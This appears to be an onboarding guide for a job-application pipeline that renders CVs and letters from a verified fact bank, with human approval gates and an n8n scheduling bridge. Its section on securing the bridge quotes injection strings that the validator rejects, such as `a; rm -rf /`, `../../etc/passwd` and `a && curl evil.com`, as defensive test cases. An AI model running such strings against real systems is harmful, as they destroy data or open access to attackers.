# Onboarding: how this whole thing works

You have just cloned a repo full of Python scripts and some n8n workflow files. This
document explains what it is, why it is built the way it is, and how to run the whole thing
yourself. No prior context needed.

Read it once end to end before running anything. It takes about twenty minutes and will
save you a day.

---

## 1. What problem this solves

Applying for jobs properly is slow. For each role you should read the posting, work out
whether it is worth an hour, rewrite your CV to lead with the relevant things, write a
letter that shows you actually looked at the company, send it, and remember to follow up.
Doing that well takes 45–90 minutes per application. Most people either do it badly at
volume, or do it well for five jobs and burn out.

The obvious fix is "get an AI to write my applications". That fix does not work, and
understanding *why* is the single most important thing in this repo.

### Why the obvious fix fails

Ask a language model to "tailor my CV to this job" from a PDF and it will, reliably and
without warning, **make things up**. A job title that sounds better. A year of experience
you do not have. A technology you have never touched. Not every time — maybe one in
fifteen. And you will not catch it, because by the twentieth CV that week you are skimming.

Then a hiring manager asks about the thing you never did, in an interview, out loud.

You cannot prompt your way out of this. "Please do not hallucinate" is not a control. What
works is **structure**: make the invention physically impossible rather than discouraged.

### The idea this repo is built on

> **Automate the assembly. Never automate the judgement.**

Assembly is: finding postings, filtering out the obviously wrong ones, ranking what is
left, pulling the right evidence together, formatting a document, remembering to follow up.
That is hours of dull work per week and a machine should do all of it.

Judgement is: deciding this job is worth your time, deciding this CV leads with the right
thing, writing the two sentences that show you are a person, and pressing send.

Every tool here does the first and stops at the second. Where a human must act, the tooling
**fails a check** rather than reminding you — because a reminder you can ignore at 11pm on a
Sunday is not a control either.

---

## 2. The mental model

Two things exist:

**The fact bank.** A structured file of everything true about your professional history.
Not a CV — a database. One claim per record, each with evidence, metrics, and who actually
did the work.

**Pipelines that render it.** A CV is a *view* of the fact bank. So is a motivation letter,
so is an article. You never edit a CV; you edit the bank and re-render.

```
                    ┌─────────────────┐
                    │   FACT BANK     │   one source of truth
                    │  29 atomic      │   profile · entities · facts · vocab
                    │  claims         │
                    └────────┬────────┘
                             │
        ┌────────────────────┼────────────────────┐
        │                    │                    │
   ┌────▼─────┐        ┌─────▼──────┐      ┌──────▼─────┐
   │   CVs    │        │  LETTERS   │      │  ARTICLES  │
   │ 5 variants│       │  per job   │      │  per claim │
   └──────────┘        └────────────┘      └────────────┘
```

Change a fact once and every document that uses it updates. Nothing is retyped, so nothing
drifts out of sync.

---

## 3. Setup (about 30 minutes)

You need Python 3.11+ and nothing else. No LaTeX, no API key, no database.

```bash
pip install pyyaml
cd fact-bank
for f in profile entities facts vocab; do cp $f.example.yaml $f.yaml; done
cp answers.example.yaml answers.yaml
python validate.py
```

If `validate.py` prints `OK`, you are running. It works out of the box on a fictional
example bank so you can see the whole pipeline before putting your own life into it.

Then replace the example data with yours. That is the real work and it takes 3–5 hours.
Section 5 explains what goes in it.

---

## 4. The daily loop

This is the whole thing. Five commands.

```bash
python discover.py          # find jobs           (2 min, ~35s of it fetching)
python rank.py              # score and rank      (instant)
#   → you read the digest and decide what to pursue        ← GATE 1
python rank.py --decide     # record your choices

python tailor.py jobs/<slug>.yaml    # CV for that job     ← then GATE 2: read it
python letter.py jobs/<slug>.yaml    # letter draft        ← then GATE 3: write the opening
python package.py <slug>             # assemble everything
#   → you submit it                                        ← GATE 4
python package.py --sent <slug>      # start the clock

python track.py             # weekly: what is working
```

That is it. Everything below explains what each command does and why it refuses to do
certain things.

---

## 5. The fact bank (build this first)

### Three files, two layers

`entities.yaml` holds **things you did over a period** — a job, a project, a degree. Dates
and authorship live here, once.

`facts.yaml` holds **atomic claims** attached to an entity. One claim per record. If a
bullet joins two verbs with "and", it is two facts.

`vocab.yaml` is a **controlled vocabulary** for skill tags.

Why separate entities from facts? A CV renders entities in date order with bullets
underneath, while search works on individual claims. Splitting them means an employer name
exists in exactly one place and cannot drift.

Why a controlled vocabulary? Because free-text tags rot. Within a month you would have
`sklearn`, `scikit-learn` and `Scikit-Learn` as three different tags, and searches would
silently return a third of what they should. Nothing errors. Your CV is just quietly worse.
The validator rejects any tag not in the vocabulary, so adding a skill is a deliberate act.

### A fact looks like this

```yaml
- id: f-ranker-baseline
  entity: ent-ranker
  type: insight
  claim: >
    Established that a zero-parameter cosine-similarity baseline outperformed the first
    supervised model on held-out documents.
  claim_short: "Established a zero-parameter cosine baseline that beat the first supervised model."
  outcome: >
    Prevented the team from shipping a model worse than doing nothing.
  outcome_short: "Stopped a model shipping that was worse than doing nothing."
  contribution: led            # on shared work: led | joint | supported
  evidence: https://github.com/...
  metrics:
    - {name: baseline_roc_auc, value: 0.69}
  skills: [benchmarking, model-evaluation]
  archetypes: [data-scientist]
  strength: 3                  # 1 weak · 2 solid · 3 lead with this
  status: confirmed            # draft until YOU say otherwise
```

### Why there are two versions of everything

`claim` is written for **search**: self-contained, unambiguous, ~300 characters. That is
right for matching against a job posting.

`claim_short` is the **CV bullet**: ~140 characters. Same truth, different job.

Writing one text for both gives you a bad bullet and a bad matcher. The same split appears
in three places in this repo (`claim`/`claim_short`, `outcome`/`outcome_short`,
`profile`/`match_text`). Once you have seen it three times it is a rule:

> **When the same information is read by a person and by a search system, split the field.**

### The guardrails, and why each exists

Every one of these was added because it caught something real.

| Field | Stops |
|---|---|
| `status: draft → confirmed` | Anything you have not personally vouched for. **Nothing renders until you flip it.** |
| `contribution: led/joint/supported` | Team work quietly becoming solo work. `supported` facts **never** appear on a CV. |
| `scope: created/operated` | "I worked inside a good system" becoming "I built it". |
| `forbidden_verbs` | `led`, `owned`, `architected` on team work. |
| `deny_list` | Technologies you cannot defend in an interview. |
| Derived skills section | A skills list longer than the evidence. It is **computed** from the bullets that rendered, so it cannot contain a skill nothing supports. |

**The `contribution` field is the one juniors underestimate.** If you worked on a two-person
project and your CV says "Built X", a hiring manager reads that as *you* built X. Sometimes
that is fair. Sometimes your partner built it and you watched. Marking it `supported`
removes it from your CV entirely while keeping it in the bank — because you will still be
asked about it in the interview, and you should be able to talk about it honestly.

**A design note you will see repeated:** the verb guards are **deny-lists, not allow-lists**.
An allow-list of permitted verbs fights you constantly and gets switched off within a week.
A narrow deny-list of credit-claiming verbs fires rarely and only on the failure that
matters. A check that cries wolf is worse than no check — it teaches you to ignore checks.

### Confirming facts

```bash
python confirm.py            # writes out/worksheet.md and confirm.txt
# tick [x] in confirm.txt
python confirm.py --apply
```

Ticking a box asserts four things: it is true, at the right scope, the verb matches what
you did, and **you can defend it under follow-up**. That third one is what people skip. A
fact you cannot survive a follow-up question on is worse than no fact — it turns a good
interview into a bad one at the worst possible moment.

---

## 6. Stage by stage

### `discover.py` — find jobs

Fetches from ~10 job APIs and RSS feeds plus **47 company career boards**, normalises
everything into one shape, removes duplicates, and applies cheap rule-based filters.

**Only sources that permit automated access.** Indeed, StepStone, LinkedIn and XING all
prohibit scraping in their terms, actively block it, and can ban the account you are
job-searching *with*. For those, the file documents the email-alert route instead: subscribe
to their alerts like a normal user and parse your inbox. That is using the service as
intended.

**Company boards are the best tier and most people miss them.** Greenhouse, Lever, Ashby and
Personio all serve a public JSON endpoint so a company can embed its own board. Using it is
what it is for. You pick the 40 employers you actually want; no aggregator noise, no
recruiter spam, and postings appear the day they go live.

Tokens are not guessable — you probe them. First attempt found 16 of 51 companies. Probing
**all four ATS patterns** for each company found 32 more, including six that had been in the
"not found" list. **A 404 on one pattern tells you nothing about the others.**

The filter is tuned for **recall, not precision**: it drops only what is certainly wrong
(wrong country, "10+ years", explicitly senior). A job wrongly dropped never appears, so you
never learn it was dropped. A job wrongly kept costs thirty seconds. When the two errors are
that lopsided, let things through.

### `rank.py` — score and rank

Scores every job against your role archetypes using **BM25**, a classic text-matching
algorithm. Not embeddings. For a few dozen jobs a day, embedding infrastructure is
over-engineering: BM25 is instant, needs no API key, and `--explain` shows you exactly why
it ranked what it ranked.

**Two things this refuses to do**, and both are the point:

*Scores are batch-relative and say so.* BM25 depends on the corpus, so today's 14.2 and
tomorrow's are not the same scale. Only the **rank within a run** is meaningful.

*An argmax without a margin is a point estimate with no error bar.* Your archetypes share
most of their vocabulary, so the "winning" one is often noise. Measured on real batches,
margins between the top two ranged from 76% down to 21%. Below 30% the tool prints
`~ai-engineer?/data-scientist?` rather than asserting a label it cannot support.

### `tailor.py` — the CV for one job

Retrieves the facts matching each requirement, selects a set, renders a document.

**Selection is greedy set cover, not top-N.** Taking the highest-scoring facts gives you a
redundant CV — five bullets answering the requirement you match best and nothing for the
other four. Instead it asks at each step: which fact adds the most *new* requirement
coverage?

Two refinements, both forced by real runs:

1. **Coverage credit is capped at two requirements per fact.** Uncapped, the winner was a
   generic keyword-dense line that matched four requirements at once and was the weakest
   fact in the bank. A reader does not credit one bullet with satisfying four separate
   requirements, so the objective should not either.
2. **Skill backfill.** A posting's skills are detected across the whole description, but
   matching only reads the requirement lines — so "our stack is Postgres and Docker" in
   prose could never pull in the fact evidencing it.

**The renderer never writes.** It selects, orders, caps, formats. Every word comes verbatim
from the bank, and `trace.json` proves it line by line. A renderer that cannot phrase cannot
hallucinate.

**The most useful output is the uncovered list.** When requirements go unmatched, the tool
names them. That is not a failure — it is your skill gap for that job, stated precisely.
Aggregate it across thirty applications and it is a curriculum written by the market.

### `letter.py` — the motivation letter

Same evidence as the CV, so the two documents argue from one body of facts.

**The draft ships with the opening as a TODO block and every gate fails while it is there.**
There is no way to skip it. The first two sentences are the only part likely to be read
carefully and the part where a human voice shows; a model writes competent, forgettable
openings, and forgettable is fatal there.

Company hooks come **from the posting, never a web fetch**. Guessing a company homepage is
fragile, and a wrong page produces a letter confidently specific about the *wrong company* —
the worst failure this stage can have.

Gates: opening written · a proper noun from this posting in the first two sentences · not
"I am writing to apply…" · under 0.75 similarity to your previous letters · every number
traced to a cited fact · no deny-listed claim.

That similarity check is worth understanding: **if a machine cannot tell this letter apart
from your last one, neither can the reader.** Above the threshold it is boilerplate with the
name swapped, which is worse than no letter because it is evidence you did not care.

### `package.py` — assemble, then stop

Gathers the CV, the letter, a checklist with your screening answers filled in, and a
follow-up calendar file into one folder. Refuses while any gate is failing.

**There is no `--submit` flag and there will not be one.** Four reasons, any one sufficient:
automated submission breaks most platforms' terms and risks the account you are searching
with; a wrong-company letter cannot be recalled; portal logins and CAPTCHAs should not be
automated on someone's behalf; and "why us?" is answered by a person or answered badly.

What this removes is the twenty minutes of assembly *around* a submission, not the
submission.

### `track.py` — did any of it work

Logs applications to a CSV you edit in a spreadsheet, and reports response rates.

**Three refusals, and they are the whole stage:**

1. **Below 25 resolved applications it prints no rate at all.** At 7 replies from 19
   applications the 95% interval is 19%–59% — it spans nearly every value it could take. A
   number there would look like a finding and be an anecdote.
2. **No reply is not a rejection.** It is not-yet-observed. Applications inside a 21-day
   window are held out as *censored*, because counting them as failures biases every rate
   downwards, worst exactly when you are most active.
3. **It compares point estimates rather than listing them.** On test data seeded with a real
   effect it reported 50% against 12% and still said: *the intervals overlap — not yet a
   difference you can act on.*

That third one matters most. Two numbers can look decisive while their intervals overlap
completely. Saying so is the difference between a report and a rationalisation.

---

## 7. Where the human decides

Four gates. They are not politeness; each is a place where a machine would make a specific,
costly mistake.

| Gate | Where | What you do | Why a machine cannot |
|---|---|---|---|
| **1** | after `rank.py` | Pick which jobs to pursue | The model does not know you met someone from that company and disliked them. It also has not learned what you want yet — **your choices are the training data.** |
| **2** | after `tailor.py` | Read the CV | Automated checks catch mechanical failures. They cannot catch a CV that is accurate, passes everything, and leads with the wrong thing. |
| **3** | in `letter.py` | Write the opening | It is the part that gets read and the part where voice shows. |
| **4** | after `package.py` | Submit it | Terms of service, irreversibility, credentials, and screening questions. |

Gates 1, 3 and 4 are **structurally enforced** — the tooling produces nothing until you act.
Gate 2 is the one you can skip, so it is the one to be disciplined about.

**Gate 1 does double duty and this is easy to miss.** Every pursue/skip is recorded with the
job's features *at that moment*. After ~150 decisions you can fit a model on
`(features) → your choice` and tune the ranker against your own judgement instead of
someone's default thresholds. Your job search becomes a supervised learning problem with you
as the annotator. Start logging on day one even though you cannot use it for two months.

---

## 8. The n8n layer

Everything above runs from a shell. n8n adds two things: **it runs on a schedule**, and it
**gives Gate 1 a button** instead of a text file.

That is all it adds. It is worth being clear about that before you install anything.

### Why a bridge instead of Execute Command nodes

n8n usually runs in Docker. The pipeline is Python on your host machine. **A container
cannot run a program on its host.**

The workarounds are worse than the indirection. Installing Python into the n8n image breaks
on every image update. Mounting your filesystem into a Node container to shell out is
fragile and painful to debug when it fails at 07:00 on a Tuesday.

So the tools stay put and expose a narrow local HTTP API. n8n drives them with ordinary HTTP
Request nodes.

```
  ┌──────────────┐        HTTP           ┌──────────────┐        subprocess
  │  n8n         │ ────────────────────► │  bridge.py   │ ──────────────────► the tools
  │  (Docker)    │   127.0.0.1:899       │  (host)      │   fixed argv lists
  └──────────────┘   bearer token        └──────────────┘
```

The nice consequence: nothing in the workflows changes if you move n8n to another machine,
or drop n8n entirely and call the same endpoints from cron.

### The bridge is a server that runs programs, so treat it like one

Three constraints, none optional:

1. **Bound to `127.0.0.1`.** Not `0.0.0.0`. Changing this publishes a remote code execution
   endpoint on your network. Do not.
2. **A fixed action allowlist.** No endpoint takes a command string. Each route maps to a
   hard-coded argument list, and the only caller-supplied value is a job slug validated
   against `[a-z0-9._-]{1,80}` before it goes anywhere near a subprocess. Tested against
   `a; rm -rf /`, `../../etc/passwd`, `a && curl evil.com` and `$(whoami)` — all rejected.
3. **Bearer token**, generated on first run, gitignored.

### Running it

```bash
python bridge.py                    # leave running; prints the token
npx n8n                             # or the Docker command in n8n/README.md
```

Then in n8n: set three variables (`BRIDGE_TOKEN`, `BRIDGE_PORT`, `NOTIFY_EMAIL`), import the
two JSON files, attach an SMTP credential.

### How Gate 1 works in n8n

A **Wait** node set to *On webhook call* pauses the workflow indefinitely. The digest email
renders two links per job — `pursue` and `skip` — pointing at that execution's resume URL.
Clicking one resumes the workflow with your verdict attached.

**Gates 2, 3 and 4 are deliberately absent from n8n.** After the CV and letter exist you get
an email and the workflow *ends*. Building an approve button for reading your CV or writing
your letter opening would turn three acts of judgement into three clicks, which is exactly
the failure this design is arranged against.

### Do not start here

Run the pipeline by hand for a week first. n8n buys scheduling and a button; it does not
buy anything the pipeline cannot already do, and you will understand what to tune far better
after seven manual mornings than after installing a scheduler on a process you have not felt.

---

## 9. The design rules, extracted

These transfer to work that has nothing to do with job hunting. They are the actual
takeaway.

**Structure beats prompting.** If a mistake must not happen, make it impossible rather than
discouraged. `status: draft` is worth more than any amount of "remember to check".

**A check that cries wolf is worse than no check.** Three checks in this repo had to be
tuned *down* after firing on 75% of inputs. Precision matters more than recall in a
guardrail, because an ignored guardrail is not a guardrail.

**Deny-lists, not allow-lists**, for anything a human writes freely.

**Missing data is not permission.** A filter that skips when a field is empty has a hole in
it. Three location bugs, all this shape, let a job in Portugal rank third on a search
restricted to Germany.

**Cheap first, expensive as a challenger.** BM25 before embeddings. A deterministic selector
before an LLM. Then *measure* whether the expensive one wins. Often it does not.

**A point estimate without an interval is a guess with a decimal point.** This applies to
model comparisons, response rates, and archetype labels alike.

**Snapshot features at decision time.** Re-deriving them later scores against a corpus that
no longer exists.

**Look at the artefact.** Three defects passed every validator and every character count and
were invisible until someone opened the rendered page: a CV rendering dark-on-dark, headers
wrapping and pushing dates out of alignment, and a section heading with nothing under it.

**Verify provenance with `git log`, never a README.** A README describes software; it does
not say who wrote it. Nine CV facts were once seeded from a repo that turned out to belong
to someone else, under a proprietary licence, because a directory sat in a personal folder.

---

## 10. Your first week

**Day 1.** Setup, then read `validate.py`'s output. Run the example bank end to end so you
have seen a CV come out the other side.

**Days 2–3.** Build your fact bank. Take your existing CV apart into facts, then add
everything it had to leave out. Expect the bank to end up 3–4× the size of the CV. This is
the unglamorous part and it is the part everything else depends on.

**Day 4.** Fill in `answers.yaml`. Research your salary range properly before writing it —
that is the one answer that costs real money if written carelessly, which is why the tool
leaves it blank rather than inventing one.

**Day 5.** Run `discover.py` and `rank.py`. Do a real Gate 1 pass. Notice which sources
produced anything worth pursuing.

**Week 2.** Add employer boards for companies you actually want. Probe all four ATS patterns
per company. This is the highest-value hour in the whole setup.

**Week 3+.** Apply. Log outcomes. Do not read the response rate until 25 applications have
resolved, and hold your CV variant fixed for those 25 so the number means something.

**Then** consider n8n.

---

## 11. When something breaks

| Symptom | Usual cause |
|---|---|
| `validate.py` errors on a skill | Tag not in `vocab.yaml`. Fix the tag or add the skill deliberately. |
| A render produces nothing | Every fact is still `status: draft`. That is the gate working. |
| `discover.py` returns 0 new | Everything was already seen. `--reset-seen` to rebuild. |
| A source fails | Feeds move. The run continues and reports which failed; fix or disable it in `sources.yaml`. |
| n8n cannot reach the bridge | Bridge not running, or wrong host — `host.docker.internal` in Docker, `127.0.0.1` natively. |
| A letter gate will not pass | Read what it says. It is usually right. |

Every tool prints what it did and why it refused. Read the output before changing the code.
